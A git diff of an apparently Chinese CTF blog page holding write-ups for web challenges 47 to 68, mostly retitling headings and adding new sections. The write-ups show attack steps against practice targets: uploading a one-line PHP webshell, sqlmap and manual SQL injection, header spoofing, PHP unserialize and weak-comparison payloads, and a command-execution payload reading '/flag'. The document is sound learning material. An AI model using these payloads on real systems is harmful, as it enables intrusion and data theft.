 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402021330448.png" alt="image-20240202133002278"></p>
 <p>得到flag</p>
 
-        <h2 id="四十七、-GDOUCTF-2023-受不了一点"   >
-          <a href="#四十七、-GDOUCTF-2023-受不了一点" class="heading-link"><i class="fas fa-link"></i></a><a href="#四十七、-GDOUCTF-2023-受不了一点" class="headerlink" title="四十七、[GDOUCTF 2023]受不了一点"></a>四十七、[GDOUCTF 2023]受不了一点</h2>
+        <h1 id="四十七、-GDOUCTF-2023-受不了一点"   >
+          <a href="#四十七、-GDOUCTF-2023-受不了一点" class="heading-link"><i class="fas fa-link"></i></a><a href="#四十七、-GDOUCTF-2023-受不了一点" class="headerlink" title="四十七、[GDOUCTF 2023]受不了一点"></a>四十七、[GDOUCTF 2023]受不了一点</h1>
       <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402021447505.png" alt="image-20240202144743440"></p>
 <p>阅读代码</p>
 <p>①用POST方法传入“ctf”和”gdou“变量，并且这两个变量的md5值相同，没有过滤函数，因此可以用数组绕过</p>
@@ -3146,8 +3371,8 @@ exit;
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402021458001.png" alt="image-20240202145800970"></p>
 <p>得到flag</p>
 
-        <h2 id="四十八、-SWPUCTF-2022-新生赛-奇妙的MD5"   >
-          <a href="#四十八、-SWPUCTF-2022-新生赛-奇妙的MD5" class="heading-link"><i class="fas fa-link"></i></a><a href="#四十八、-SWPUCTF-2022-新生赛-奇妙的MD5" class="headerlink" title="四十八、[SWPUCTF 2022 新生赛]奇妙的MD5"></a>四十八、[SWPUCTF 2022 新生赛]奇妙的MD5</h2>
+        <h1 id="四十八、-SWPUCTF-2022-新生赛-奇妙的MD5"   >
+          <a href="#四十八、-SWPUCTF-2022-新生赛-奇妙的MD5" class="heading-link"><i class="fas fa-link"></i></a><a href="#四十八、-SWPUCTF-2022-新生赛-奇妙的MD5" class="headerlink" title="四十八、[SWPUCTF 2022 新生赛]奇妙的MD5"></a>四十八、[SWPUCTF 2022 新生赛]奇妙的MD5</h1>
       <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402041134435.png" alt="image-20240204113428318"></p>
 <p>查看网页源代码没啥线索，抓包看看</p>
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402041136204.png" alt="image-20240204113616165"></p>
@@ -3166,8 +3391,8 @@ exit;
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402041137910.png" alt="image-20240204113740874"></p>
 <p>得到flag</p>
 
-        <h2 id="四十九、-HNCTF-2022-Week1-easy-upload"   >
-          <a href="#四十九、-HNCTF-2022-Week1-easy-upload" class="heading-link"><i class="fas fa-link"></i></a><a href="#四十九、-HNCTF-2022-Week1-easy-upload" class="headerlink" title="四十九、[HNCTF 2022 Week1]easy_upload"></a>四十九、[HNCTF 2022 Week1]easy_upload</h2>
+        <h1 id="四十九、-HNCTF-2022-Week1-easy-upload"   >
+          <a href="#四十九、-HNCTF-2022-Week1-easy-upload" class="heading-link"><i class="fas fa-link"></i></a><a href="#四十九、-HNCTF-2022-Week1-easy-upload" class="headerlink" title="四十九、[HNCTF 2022 Week1]easy_upload"></a>四十九、[HNCTF 2022 Week1]easy_upload</h1>
       <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402041152938.png" alt="image-20240204115202903"></p>
 <p>没有要求哪种类型的文件，直接上传写有一句话木马的.php文件</p>
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402041149550.png" alt="image-20240204114917510"></p>
@@ -3177,8 +3402,8 @@ exit;
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402041151201.png" alt="image-20240204115144168"></p>
 <p>得到flag</p>
 
-        <h2 id="五十、-SWPUCTF-2022-新生赛-1z-unserialize"   >
-          <a href="#五十、-SWPUCTF-2022-新生赛-1z-unserialize" class="heading-link"><i class="fas fa-link"></i></a><a href="#五十、-SWPUCTF-2022-新生赛-1z-unserialize" class="headerlink" title="五十、[SWPUCTF 2022 新生赛]1z_unserialize"></a>五十、[SWPUCTF 2022 新生赛]1z_unserialize</h2>
+        <h1 id="五十、-SWPUCTF-2022-新生赛-1z-unserialize"   >
+          <a href="#五十、-SWPUCTF-2022-新生赛-1z-unserialize" class="heading-link"><i class="fas fa-link"></i></a><a href="#五十、-SWPUCTF-2022-新生赛-1z-unserialize" class="headerlink" title="五十、[SWPUCTF 2022 新生赛]1z_unserialize"></a>五十、[SWPUCTF 2022 新生赛]1z_unserialize</h1>
       <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402051103390.png" alt="image-20240205110348342"></p>
 <p><em>destruct 方法在对象销毁时会自动调用，而且其中的代码会在函数调用时执行。unserialize($_POST[‘nss’]);执行完成后，这个通过 unserialize 重新创建的对象没有被任何变量引用，因此它将会被标记为不再需要，并最终会被 PHP 垃圾回收机制销毁。在对象被销毁的时候，destruct 方法会被自动调用。</em></p>
 <p>题中给的</p>
@@ -3204,8 +3429,8 @@ exit;
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402051103322.png" alt="image-20240205110323212"></p>
 <p>得到flag</p>
 
-        <h2 id="五十一、-HNCTF-2022-Week1-What-is-Web"   >
-          <a href="#五十一、-HNCTF-2022-Week1-What-is-Web" class="heading-link"><i class="fas fa-link"></i></a><a href="#五十一、-HNCTF-2022-Week1-What-is-Web" class="headerlink" title="五十一、[HNCTF 2022 Week1]What is Web"></a>五十一、[HNCTF 2022 Week1]What is Web</h2>
+        <h1 id="五十一、-HNCTF-2022-Week1-What-is-Web"   >
+          <a href="#五十一、-HNCTF-2022-Week1-What-is-Web" class="heading-link"><i class="fas fa-link"></i></a><a href="#五十一、-HNCTF-2022-Week1-What-is-Web" class="headerlink" title="五十一、[HNCTF 2022 Week1]What is Web"></a>五十一、[HNCTF 2022 Week1]What is Web</h1>
       <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402051124520.png" alt="image-20240205112419458"></p>
 <p>页面上没找到有用的信息，看看网页源代码</p>
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402051124874.png" alt="image-20240205112454804"></p>
@@ -3213,8 +3438,8 @@ exit;
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402051125497.png" alt="image-20240205112515454"></p>
 <p>得到flag</p>
 
-        <h2 id="五十二、-HNCTF-2022-Week1-Interesting-http"   >
-          <a href="#五十二、-HNCTF-2022-Week1-Interesting-http" class="heading-link"><i class="fas fa-link"></i></a><a href="#五十二、-HNCTF-2022-Week1-Interesting-http" class="headerlink" title="五十二、[HNCTF 2022 Week1]Interesting_http"></a>五十二、[HNCTF 2022 Week1]Interesting_http</h2>
+        <h1 id="五十二、-HNCTF-2022-Week1-Interesting-http"   >
+          <a href="#五十二、-HNCTF-2022-Week1-Interesting-http" class="heading-link"><i class="fas fa-link"></i></a><a href="#五十二、-HNCTF-2022-Week1-Interesting-http" class="headerlink" title="五十二、[HNCTF 2022 Week1]Interesting_http"></a>五十二、[HNCTF 2022 Week1]Interesting_http</h1>
       <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402071151506.png" alt="image-20240207115118460"></p>
 <p>用POST方法传入参数want，那肯定是想要flag，所以传入</p>
 <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">want=flag</span><br></pre></td></tr></table></div></figure>
@@ -3233,8 +3458,8 @@ exit;
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402071157102.png" alt="image-20240207115727060"></p>
 <p>得到flag</p>
 
-        <h2 id="五十三、-鹤城杯-2021-Middle-magic"   >
-          <a href="#五十三、-鹤城杯-2021-Middle-magic" class="heading-link"><i class="fas fa-link"></i></a><a href="#五十三、-鹤城杯-2021-Middle-magic" class="headerlink" title="五十三、[鹤城杯 2021]Middle magic"></a>五十三、[鹤城杯 2021]Middle magic</h2>
+        <h1 id="五十三、-鹤城杯-2021-Middle-magic"   >
+          <a href="#五十三、-鹤城杯-2021-Middle-magic" class="heading-link"><i class="fas fa-link"></i></a><a href="#五十三、-鹤城杯-2021-Middle-magic" class="headerlink" title="五十三、[鹤城杯 2021]Middle magic"></a>五十三、[鹤城杯 2021]Middle magic</h1>
       <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402071217818.png" alt="image-20240207121715759"></p>
 <p>①用GET方法传入参数aaa，使用 <code>preg_replace</code> 函数来过滤掉参数中的 “level” 字符串，并将其替换为 “<!-- filtered -->“。然后，使用 <code>preg_match</code> 函数检查处理后的 <code>$aaa</code> 变量中是否包含 “pass_the_level_1#” 字符串。如果包含，表示通过了第一级的检查。可以用换行符%0A来绕过</p>
 <p>②用POST方法传入admin和root_pwd参数，两者值不等但是sha1值要相等。可以用数组绕过</p>
@@ -3245,8 +3470,8 @@ exit;
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402071223259.png" alt="image-20240207122354217"></p>
 <p>得到flag</p>
 
-        <h2 id="五十四、-SWPUCTF-2022-新生赛-where-am-i"   >
-          <a href="#五十四、-SWPUCTF-2022-新生赛-where-am-i" class="heading-link"><i class="fas fa-link"></i></a><a href="#五十四、-SWPUCTF-2022-新生赛-where-am-i" class="headerlink" title="五十四、[SWPUCTF 2022 新生赛]where_am_i"></a>五十四、[SWPUCTF 2022 新生赛]where_am_i</h2>
+        <h1 id="五十四、-SWPUCTF-2022-新生赛-where-am-i"   >
+          <a href="#五十四、-SWPUCTF-2022-新生赛-where-am-i" class="heading-link"><i class="fas fa-link"></i></a><a href="#五十四、-SWPUCTF-2022-新生赛-where-am-i" class="headerlink" title="五十四、[SWPUCTF 2022 新生赛]where_am_i"></a>五十四、[SWPUCTF 2022 新生赛]where_am_i</h1>
       <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402081051175.png" alt="image-20240208105147872"></p>
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402081052730.png" alt="image-20240208105208690"></p>
 <p>查看网页源代码也没什么有用的信息，但是根据后面的11位提示可以知道是要我们填写一个电话号码，而它又放了一张图，猜测可能是要填写这个图所对应的电话号码，拿去百度识图</p>
@@ -3257,15 +3482,15 @@ exit;
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402081055568.png" alt="image-20240208105546526"></p>
 <p>得到flag</p>
 
-        <h2 id="五十五、-FSCTF-2023-源码！启动"   >
-          <a href="#五十五、-FSCTF-2023-源码！启动" class="heading-link"><i class="fas fa-link"></i></a><a href="#五十五、-FSCTF-2023-源码！启动" class="headerlink" title="五十五、[FSCTF 2023]源码！启动!"></a>五十五、[FSCTF 2023]源码！启动!</h2>
+        <h1 id="五十五、-FSCTF-2023-源码！启动"   >
+          <a href="#五十五、-FSCTF-2023-源码！启动" class="heading-link"><i class="fas fa-link"></i></a><a href="#五十五、-FSCTF-2023-源码！启动" class="headerlink" title="五十五、[FSCTF 2023]源码！启动!"></a>五十五、[FSCTF 2023]源码！启动!</h1>
       <p>名字直接提示了查看源码，尝试了右键和F12都被禁用了，那就直接在url前加上</p>
 <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:</span><br></pre></td></tr></table></div></figure>
 
 <p>同[UUCTF 2022 新生赛]websign</p>
 
-        <h2 id="五十六、-SWPUCTF-2021-新生赛-easy-sql"   >
-          <a href="#五十六、-SWPUCTF-2021-新生赛-easy-sql" class="heading-link"><i class="fas fa-link"></i></a><a href="#五十六、-SWPUCTF-2021-新生赛-easy-sql" class="headerlink" title="五十六、[SWPUCTF 2021 新生赛]easy_sql"></a>五十六、[SWPUCTF 2021 新生赛]easy_sql</h2>
+        <h1 id="五十六、-SWPUCTF-2021-新生赛-easy-sql"   >
+          <a href="#五十六、-SWPUCTF-2021-新生赛-easy-sql" class="heading-link"><i class="fas fa-link"></i></a><a href="#五十六、-SWPUCTF-2021-新生赛-easy-sql" class="headerlink" title="五十六、[SWPUCTF 2021 新生赛]easy_sql"></a>五十六、[SWPUCTF 2021 新生赛]easy_sql</h1>
       <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261150467.png" alt="image-20240526115003383">让我们输入内容，并且网页名已经告知了参数为wllm</p>
 <p>肯定是存在注入漏洞的</p>
 
@@ -3313,8 +3538,8 @@ exit;
 
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261158456.png" alt="image-20240526115822405"></p>
 
-        <h2 id="五十七、-NCTF-2018-签到题"   >
-          <a href="#五十七、-NCTF-2018-签到题" class="heading-link"><i class="fas fa-link"></i></a><a href="#五十七、-NCTF-2018-签到题" class="headerlink" title="五十七、[NCTF 2018]签到题"></a>五十七、[NCTF 2018]签到题</h2>
+        <h1 id="五十七、-NCTF-2018-签到题"   >
+          <a href="#五十七、-NCTF-2018-签到题" class="heading-link"><i class="fas fa-link"></i></a><a href="#五十七、-NCTF-2018-签到题" class="headerlink" title="五十七、[NCTF 2018]签到题"></a>五十七、[NCTF 2018]签到题</h1>
       <p><img src="C:/Users/86173/AppData/Roaming/Typora/typora-user-images/image-20240527160736048.png" alt="image-20240527160736048"></p>
 <p>一点开是一个百度的页面，但是URL上显示是一个/secret.php，访问一下首页/index.php，查看网页源代码也啥也没看见</p>
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405271608920.png" alt="image-20240527160834865"></p>
@@ -3322,8 +3547,8 @@ exit;
 <p><img src="C:/Users/86173/AppData/Roaming/Typora/typora-user-images/image-20240527160945174.png" alt="image-20240527160945174"></p>
 <p>看到了flag，但是提交时要以NSSCTF{}格式提交</p>
 
-        <h2 id="五十八、-SWPUCTF-2021-新生赛-error"   >
-          <a href="#五十八、-SWPUCTF-2021-新生赛-error" class="heading-link"><i class="fas fa-link"></i></a><a href="#五十八、-SWPUCTF-2021-新生赛-error" class="headerlink" title="五十八、[SWPUCTF 2021 新生赛]error"></a>五十八、[SWPUCTF 2021 新生赛]error</h2>
+        <h1 id="五十八、-SWPUCTF-2021-新生赛-error"   >
+          <a href="#五十八、-SWPUCTF-2021-新生赛-error" class="heading-link"><i class="fas fa-link"></i></a><a href="#五十八、-SWPUCTF-2021-新生赛-error" class="headerlink" title="五十八、[SWPUCTF 2021 新生赛]error"></a>五十八、[SWPUCTF 2021 新生赛]error</h1>
       <p><img src="C:/Users/86173/AppData/Roaming/Typora/typora-user-images/image-20240527162650715.png" alt="image-20240527162650715"></p>
 <p>输入1后url传入id参数，可以直接用sqlmap</p>
 <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://node4.anna.nssctf.cn:28238/index.php?id=1&quot; --dbs</span><br></pre></td></tr></table></div></figure>
@@ -3336,8 +3561,8 @@ exit;
 
 <p><img src="C:/Users/86173/AppData/Roaming/Typora/typora-user-images/image-20240527162825865.png" alt="image-20240527162825865"></p>
 
-        <h2 id="五十九、-SWPUCTF-2021-新生赛-sql"   >
-          <a href="#五十九、-SWPUCTF-2021-新生赛-sql" class="heading-link"><i class="fas fa-link"></i></a><a href="#五十九、-SWPUCTF-2021-新生赛-sql" class="headerlink" title="五十九、[SWPUCTF 2021 新生赛]sql"></a>五十九、[SWPUCTF 2021 新生赛]sql</h2>
+        <h1 id="五十九、-SWPUCTF-2021-新生赛-sql"   >
+          <a href="#五十九、-SWPUCTF-2021-新生赛-sql" class="heading-link"><i class="fas fa-link"></i></a><a href="#五十九、-SWPUCTF-2021-新生赛-sql" class="headerlink" title="五十九、[SWPUCTF 2021 新生赛]sql"></a>五十九、[SWPUCTF 2021 新生赛]sql</h1>
       <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281040540.png" alt="image-20240528104050452"></p>
 <p>参数是wllm，按老步骤注入</p>
 <p>传入1’报语句错误从，存在注入</p>
@@ -3396,8 +3621,8 @@ exit;
 <p><img src="C:/Users/86173/AppData/Roaming/Typora/typora-user-images/image-20240527170602884.png" alt="image-20240527170602884"></p>
 <p>SQL注入绕过技巧：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/Cairo_A/article/details/134882367" >https://blog.csdn.net/Cairo_A/article/details/134882367</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
 
-        <h2 id="六十、-LitCTF-2023-Http-pro-max-plus"   >
-          <a href="#六十、-LitCTF-2023-Http-pro-max-plus" class="heading-link"><i class="fas fa-link"></i></a><a href="#六十、-LitCTF-2023-Http-pro-max-plus" class="headerlink" title="六十、[LitCTF 2023]Http pro max plus"></a>六十、[LitCTF 2023]Http pro max plus</h2>
+        <h1 id="六十、-LitCTF-2023-Http-pro-max-plus"   >
+          <a href="#六十、-LitCTF-2023-Http-pro-max-plus" class="heading-link"><i class="fas fa-link"></i></a><a href="#六十、-LitCTF-2023-Http-pro-max-plus" class="headerlink" title="六十、[LitCTF 2023]Http pro max plus"></a>六十、[LitCTF 2023]Http pro max plus</h1>
       <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405272047355.png" alt="image-20240527204753296"></p>
 <p>那就添加X-Forwarded-For头</p>
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405272046340.png" alt="image-20240527204645273"></p>
@@ -3414,16 +3639,16 @@ exit;
 <p>查看网页源代码看到/sejishikong.php，访问一下</p>
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405271722292.png" alt="image-20240527172229251"></p>
 
-        <h2 id="六十一、-SWPUCTF-2022-新生赛-xff"   >
-          <a href="#六十一、-SWPUCTF-2022-新生赛-xff" class="heading-link"><i class="fas fa-link"></i></a><a href="#六十一、-SWPUCTF-2022-新生赛-xff" class="headerlink" title="六十一、[SWPUCTF 2022 新生赛]xff"></a>六十一、[SWPUCTF 2022 新生赛]xff</h2>
+        <h1 id="六十一、-SWPUCTF-2022-新生赛-xff"   >
+          <a href="#六十一、-SWPUCTF-2022-新生赛-xff" class="heading-link"><i class="fas fa-link"></i></a><a href="#六十一、-SWPUCTF-2022-新生赛-xff" class="headerlink" title="六十一、[SWPUCTF 2022 新生赛]xff"></a>六十一、[SWPUCTF 2022 新生赛]xff</h1>
       <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405280954588.png" alt="image-20240528095438474"></p>
 <p>从题目入手，用HackBar添加X-Forwarded-For头为127.0.0.1</p>
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405280955712.png" alt="image-20240528095536671"></p>
 <p>再添加Referer头为index，但几次尝试下来发现只要Referer有值就能得到flag</p>
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405280956014.png" alt="image-20240528095630962"></p>
 
-        <h2 id="六十二、-SWPUCTF-2022-新生赛-ez-sql"   >
-          <a href="#六十二、-SWPUCTF-2022-新生赛-ez-sql" class="heading-link"><i class="fas fa-link"></i></a><a href="#六十二、-SWPUCTF-2022-新生赛-ez-sql" class="headerlink" title="六十二、[SWPUCTF 2022 新生赛]ez_sql"></a>六十二、[SWPUCTF 2022 新生赛]ez_sql</h2>
+        <h1 id="六十二、-SWPUCTF-2022-新生赛-ez-sql"   >
+          <a href="#六十二、-SWPUCTF-2022-新生赛-ez-sql" class="heading-link"><i class="fas fa-link"></i></a><a href="#六十二、-SWPUCTF-2022-新生赛-ez-sql" class="headerlink" title="六十二、[SWPUCTF 2022 新生赛]ez_sql"></a>六十二、[SWPUCTF 2022 新生赛]ez_sql</h1>
       <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281006807.png" alt="image-20240528100626739"></p>
 <p>在URL上传参会提示</p>
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281006251.png" alt="image-20240528100659171"></p>
@@ -3481,6 +3706,86 @@ exit;
 
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281035772.png" alt="image-20240528103501682"></p>
 <p>这次是真的正确的flag了</p>
+
+        <h1 id="六十三、-LitCTF-2023-1zjs"   >
+          <a href="#六十三、-LitCTF-2023-1zjs" class="heading-link"><i class="fas fa-link"></i></a><a href="#六十三、-LitCTF-2023-1zjs" class="headerlink" title="六十三、[LitCTF 2023]1zjs"></a>六十三、[LitCTF 2023]1zjs</h1>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405291307288.png" alt="image-20240529130739125"></p>
+<p>查看网页源代码，右键不行那就在URL前添加view-source:</p>
+<p>查找flag，两条但都没啥信息，也许是要访问什么文件，再查找php</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405291309541.png" alt="image-20240529130912468"></p>
+<p>访问这个/<span class="exturl"><a class="exturl__link"   href="mailto:&#102;&#64;&#x6b;&#x33;&#102;&#49;&#x61;&#x67;&#x2e;&#112;&#x68;&#x70;" >&#102;&#64;&#x6b;&#x33;&#102;&#49;&#x61;&#x67;&#x2e;&#112;&#x68;&#x70;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405291309418.png"></p>
+<p>这…拿着一些字符百度一下说是Jsfuck代码，那解密一下</p>
+<p>F12打开控制台，将这一堆复制后回车</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405291314000.png" alt="image-20240529131457925"></p>
+
+        <h1 id="六十四、-LitCTF-2023-Vim-yyds"   >
+          <a href="#六十四、-LitCTF-2023-Vim-yyds" class="heading-link"><i class="fas fa-link"></i></a><a href="#六十四、-LitCTF-2023-Vim-yyds" class="headerlink" title="六十四、[LitCTF 2023]Vim yyds"></a>六十四、[LitCTF 2023]Vim yyds</h1>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405291340800.png" alt="image-20240529134044736"></p>
+<p>查看源码也没发现，用dirsearch扫描一下</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\dirsearch.py -u http://node4.anna.nssctf.cn:28213/</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405291341477.png" alt="image-20240529134134425"></p>
+<p>得到一个/.index.php.swp文件，访问一下</p>
+<p>直接下载了，用记事本打开看看</p>
+<p>虽然有点乱码，但大致还是能明白，能看得出本来的顺序应该是这个反着的</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405291343368.png" alt="image-20240529134317303"></p>
+<p>用POST方法传入password参数，并且password的值要为Give_Me_Your_Flag的base64编码后的值，这样就会返回cmd参数的值，cmd参数也是用POST方法传入的</p>
+<p>Give_Me_Your_Flag经过base64编码后为R2l2ZV9NZV9Zb3VyX0ZsYWc=</p>
+<p>可以利用命令执行，来给cmd传值，所以先看看根目录，使用HackBar传入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=R2l2ZV9NZV9Zb3VyX0ZsYWc=&amp;cmd=ls /</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405291350407.png" alt="image-20240529135008344"></p>
+<p>再打开这个flag文件</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=R2l2ZV9NZV9Zb3VyX0ZsYWc=&amp;cmd=cat /flag</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405291340830.png" alt="image-20240529134015777"></p>
+
+        <h1 id="六十五、-HUBUCTF-2022-新生赛-checkin"   >
+          <a href="#六十五、-HUBUCTF-2022-新生赛-checkin" class="heading-link"><i class="fas fa-link"></i></a><a href="#六十五、-HUBUCTF-2022-新生赛-checkin" class="headerlink" title="六十五、[HUBUCTF 2022 新生赛]checkin"></a>六十五、[HUBUCTF 2022 新生赛]checkin</h1>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405291352710.png" alt="image-20240529135200653"></p>
+<p>从 GET 请求中获取一个名为 <code>info</code> 的参数，并将其反序列化为 <code>$data_unserialize</code> 数组，然后与预定义的用户名和密码进行比较，如果用户名和密码匹配，则输出 <code>$flag</code> 的内容</p>
+<p>但是提示又说它已经更改了username和password的值</p>
+<p>这里的比较用的是弱比较，在 PHP 中，<code>true</code> 在弱比较中等于许多值，包括一些字符串和整数</p>
+<p>可以试试，构造</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$data = array(&#x27;username&#x27; =&gt; TRUE, &#x27;password&#x27; =&gt; TRUE);</span><br><span class="line">$serialized_data = serialize($data);</span><br><span class="line">echo $serialized_data;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>
+
+<p>输出为</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405291405379.png" alt="image-20240529140554329"></p>
+<p>构造最终payload</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?info=a:2:&#123;s:8:&quot;username&quot;;b:1;s:8:&quot;password&quot;;b:1;&#125;</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405291406996.png" alt="image-20240529140638916"></p>
+
+        <h1 id="六十六、-GDOUCTF-2023-hate-eat-snake"   >
+          <a href="#六十六、-GDOUCTF-2023-hate-eat-snake" class="heading-link"><i class="fas fa-link"></i></a><a href="#六十六、-GDOUCTF-2023-hate-eat-snake" class="headerlink" title="六十六、[GDOUCTF 2023]hate eat snake"></a>六十六、[GDOUCTF 2023]hate eat snake</h1>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405291415812.png" alt="image-20240529141539740"></p>
+<p>尝试了一下，坚持不到60s，查看源代码有个snake.js，看看</p>
+<p>没看明白，甚至有一堆奇奇怪怪的字符，用控制台解读一下这么一大堆</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405291417325.png" alt="image-20240529141700217"></p>
+<p>也没解读出啥…看了别人的wp，原来是回车之后还要输入这一长串后面的</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(_0x324fcb(0x2d9,0x2c3,0x2db,0x2f3)+&#x27;k3r_h0pe_t&#x27;+_0xe4a674(0x5a1,0x595,0x59e,0x57c)+&#x27;irlfriend&#125;&#x27;)</span><br></pre></td></tr></table></div></figure>
+
+<p>再回车就有flag弹窗了</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405291415149.png" alt="image-20240529141517090"></p>
+
+        <h1 id="六十七、-HNCTF-2022-Week1-2048"   >
+          <a href="#六十七、-HNCTF-2022-Week1-2048" class="heading-link"><i class="fas fa-link"></i></a><a href="#六十七、-HNCTF-2022-Week1-2048" class="headerlink" title="六十七、[HNCTF 2022 Week1]2048"></a>六十七、[HNCTF 2022 Week1]2048</h1>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405291421656.png" alt="image-20240529142152579"></p>
+<p>是一个2048游戏，查看网页源代码，有2048.js，点进去看看</p>
+<p>搜索flag、win都没搜着，搜js看到一个md5.js，而且后面还有一句</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(String.fromCharCode(24685,21916,33,102,108,97,103,123,53,51,49,54,48,99,56,56,56,101,50,53,99,51,102,56,50,56,98,50,51,101,51,49,54,97,55,97,101,48,56,51,125))</span><br></pre></td></tr></table></div></figure>
+
+<p>想到了上一题，给这句放控制台解密</p>
+<p>一回车又出现flag的弹窗了</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405291423109.png" alt="image-20240529142303046"></p>
+<p>提交时记得前面改成NSSCTF</p>
+
+        <h1 id="六十八、-NISACTF-2022-checkin"   >
+          <a href="#六十八、-NISACTF-2022-checkin" class="heading-link"><i class="fas fa-link"></i></a><a href="#六十八、-NISACTF-2022-checkin" class="headerlink" title="六十八、[NISACTF 2022]checkin"></a>六十八、[NISACTF 2022]checkin</h1>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405291429413.png" alt="image-20240529142918348"></p>
+<p>看似只需要用GET方法传值，但是一开始给提示说复制源码看看，那就复制源码到vscode</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405291430608.png" alt="image-20240529143034550"></p>
